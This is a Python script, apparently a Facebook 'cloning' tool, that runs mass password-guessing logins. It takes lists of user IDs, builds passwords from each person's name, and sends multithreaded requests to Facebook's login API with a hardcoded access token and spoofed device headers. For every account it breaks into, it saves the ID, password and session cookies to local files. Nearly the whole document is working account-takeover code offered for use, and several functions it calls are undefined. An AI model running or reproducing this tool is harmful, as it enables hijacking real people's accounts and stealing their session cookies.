import os
from os import path
from pathlib import Path
import os,base64,zlib,pip,urllib,sys,time,platform,pip,uuid,subprocess
try:
    import requests,os,json,time,re,random,sys,uuid,string
    from string import *
    from requests import api
    from concurrent.futures import ThreadPoolExecutor as tred
except ImportError:
	print('\n Installing missing modules ...')
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python BLACK.py')

#-----------------------------------##-----------------------------------#
folder_path = '/sdcard/BLACK'
try:
    os.makedirs(folder_path, exist_ok=True)
except:
    pass
#-----------------------------------##-----------------------------------#
oks=[]
cps=[]
loop=0
#-----------------------------------##-----------------------------------#
def morshed90():
        ua = '[FBAN/FB4A;FBAV/419.0.0.67.59;FBBV/692042011;FBRV/0;FBPN/com.facebook.katana;FBLC/bn_IN;FBMF/iPhone 6s Plus;FBBD/iPhone 6s Plus;FBDV/iPhone 6s Plus;FBSV/11;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
        return ua
#-----------------------------------##-----------------------------------#
logo=(f"""
\x1b[1;92m d8888b. db       .d8b.   .o88b. db   dD 
\x1b[1;92m 88  `8D 88      d8' `8b d8P  Y8 88 ,8P' 
\x1b[1;97m 88oooY' 88      88ooo88 8P      88,8P   
\x1b[1;97m 88~~~b. 88      88~~~88 8b      88`8b   
\x1b[1;92m 88   8D 88booo. 88   88 Y8b  d8 88 `88. 
\x1b[1;92m Y8888P' Y88888P YP   YP  `Y88P' YP   YD 
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 \x1b[1;92m[\x1b[1;97m⩸\x1b[1;92m] AUTHOR   : MD MORSHED
 \x1b[1;92m[\x1b[1;97m⩸\x1b[1;92m] FACEBOOK : MD MORSHED
 \x1b[1;92m[\x1b[1;97m⩸\x1b[1;92m] GITHUB   : MORSHED-404         0.1
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#-----------------------------------##-----------------------------------#
def line():
    print(f'\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def clear():
    os.system('clear');print(logo)
#-----------------------------------##-----------------------------------#
def Morshed():
        clear();print(" \x1b[1;92m[\x1b[1;97mA\x1b[1;92m] FILE CLONING");print(" \x1b[1;92m[\x1b[1;97mB\x1b[1;92m] JOIN GROUP ");print(" \x1b[1;92m[\x1b[1;97mC\x1b[1;92m] CONTACT ADMIN");print(" \x1b[1;92m[\x1b[1;97mX\x1b[1;92m] \033[1;31mEXIT");line();opt1 = input(" \x1b[1;92m[\x1b[1;97m⩸\x1b[1;92m] CHOOSE : ")
        if opt1 in ['1','A','a','01']:SCST()
        if opt1 in ['2','B','b','02']:os.system('xdg-open https://m.me/j/AbYSIjnx58Bm0qnS/');Main_BLACK()
        if opt1 in ['3','c','C','03']:os.system('xdg-open https://www.facebook.com/profile.php?id=100079519400970');Main_BLACK()
def SCST():
    clear();print(" \x1b[1;92m[\x1b[1;97m⩸\x1b[1;92m] FOR EXAMPLE: \033[1;32m/sdcard/black.txt");line()
    file = input(" \x1b[1;92m[\x1b[1;97m⩸\x1b[1;92m] PUT FILE PATH : ")
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        line();print(f' \x1b[1;92m[\x1b[1;97m⩸\x1b[1;92m] File location not found ');time.sleep(2);method()
    clear();print('\033[1;32m [\033[1;37m1\033[1;32m] \033[1;32mMethod \033[1;32m: NEW')
    print('\033[1;32m [\033[1;37m2\033[1;32m] \033[1;32mMethod \033[1;32m: OLD');line()
    methd=input(" \x1b[1;92m[\x1b[1;97m⩸\x1b[1;92m] CHOOSE : ")
    plist=[]
    clear()
    try:
        ps_limit = int(input((" \x1b[1;92m[\x1b[1;97m⩸\x1b[1;92m] ENTER PASSWORD LIMIT : ")))
    except:
        ps_limit =1
    clear()
    print(f' \x1b[1;92m[\x1b[1;97m⩸\x1b[1;92m] EXAMPLE : first last \033[1;37m|\033[1;32m first123');print(f' \x1b[1;92m[\x1b[1;97m⩸\x1b[1;92m] EXAMPLE : 57273200 59039200 57575751 ') 
    line()
    for i in range(ps_limit):
        plist.append(input(f" \x1b[1;92m[\x1b[1;97m⩸\x1b[1;92m] PUT PASSWORD\033[1;32m [\033[1;37m%s\033[1;32m]\033[1;32m : "%(i+1)))
    with tred(max_workers=30) as BLACK:
        clear()
        tl = str(len(fo))
        print(f' \x1b[1;92m[\x1b[1;97m⩸\x1b[1;92m] TOTAL IDS : {tl} \033[1;37m>> \033[1;32mMETHOD : \033[1;37m[\033[1;32mM{methd}\033[1;37m]');print(f" \x1b[1;92m[\x1b[1;97m⩸\x1b[1;92m] FIRST \033[1;37m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;37m] \033[1;92mAIRPLANE MODE \033[1;37m[\033[1;32mFILE\033[1;37m]")
        line()
        for user in fo:
            ids,names = user.split('|')
            passlist = plist
            if methd =='1':
                BLACK.submit(api0,ids,names,passlist)
            if methd =='2':
                BLACK.submit(api0,ids,names,passlist)
#━━━━━━━━━━━━━━━━━━━━#
def api0(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r\r\33[1;37m [\33[1;32mBLACK-XD\33[1;37m]-[\033[1;32m%s\033[1;37m]-\033[1;37m[\033[1;32mOK:%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbsv = str(random.randint(4,13))+'.0'
            model,build = random.choice(samsung).split('|')
            head = {'User-Agent':morshed90(),
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            data = {'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true',
            'try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'es_ES',
            'client_country_code':'ES',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
            po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
            if 'session_key' in po:
                    uid = str(po['uid'])
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    sskk = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={sskk};{ckkk}"
                    print('\r\r\033[1;37m [\033[1;32mBLACK-OK\033[1;37m]\033[1;32m '+uid+' | '+pas)
                    print(f"\033[1;37m [\033[1;32m•\033[1;37m]\033[1;32m {cookie}")
                    line()
                    file_path = os.path.join(folder_path, 'BLACK-FILE-OK.txt')
                    open('/sdcard/BLACK/BLACK-FILE-OK-COOKIE.txt','a').write(uid+' | '+pas+' | '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
            elif 'www.facebook.com' in po['error']['message']:
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r\r\33[1m\33[1;35m [BLACK-CP] '+uid+' | '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'BLACK-FILE-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#-----------------------------------##-----------------------------------#
try:
    Morshed()
except requests.exceptions.ConnectionError:
    print('\n No internet connection ...')
    exit()
